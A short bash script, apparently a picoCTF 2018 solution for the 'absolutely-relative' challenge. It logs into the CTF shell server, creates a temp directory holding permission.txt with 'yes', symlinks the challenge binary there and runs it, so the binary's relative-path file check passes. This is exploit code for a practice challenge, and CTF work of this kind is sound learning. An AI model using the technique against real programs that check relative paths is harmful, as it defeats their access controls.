#!/usr/bin/bash

#CONFIG
host='2018shell4.picoctf.com'
echo "enter user:"
read user

prefix="hahaowned"
dir_name=${prefix}${RANDOM}

file_name="permission.txt"
file_text="yes"

target_file_name="absolutely-relative"
target="/problems/absolutely-relative_4_bef88c36784b44d2585bb4d2dbe074bd/${target_file_name}"

ssh $user@$host "

    cd /tmp
    mkdir ${dir_name}
    cd ${dir_name}
    touch ${file_name}
    echo ${file_text} > ${file_name}
    ln -s ${target} .
    ./${target_file_name}

    "